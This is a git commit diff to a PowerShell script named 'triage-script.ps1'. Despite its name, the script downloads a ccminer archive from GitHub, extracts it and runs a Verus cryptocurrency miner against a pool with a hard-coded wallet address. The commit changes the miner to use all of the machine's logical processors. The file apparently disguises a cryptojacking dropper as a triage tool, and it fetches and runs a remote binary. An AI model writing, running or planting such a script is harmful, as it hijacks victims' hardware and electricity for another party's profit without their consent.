f2becd504c9eb03fed5b9748fd3cfe65bbac8afe
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2024-07-14 15:21:45 +0200

    Update and rename triage.ps1 to triage-script.ps1

--- verus/triage-script.ps1
+++ verus/triage-script.ps1
@@ -1,3 +1,4 @@
+$threads = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
 $algorithm = "verus"
 $server = "stratum+tcp://de.vipor.net:5040"
 $user = "RHACKERwSVgjTvV4vNiTjmrkLTD7a92ALD.Windows"
@@ -6,4 +7,4 @@ $password = "x"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MomboteQ/Free-Crypto-Mining/main/verus/ccminer-win.zip" -OutFile "ccminer.zip"
 Expand-Archive ccminer.zip
 
-.\ccminer\ccminer\ccminer.exe -a $algorithm -o $server -u $user -p $password
+.\ccminer\ccminer\ccminer.exe -a $algorithm -o $server -u $user -p $password -t $threads
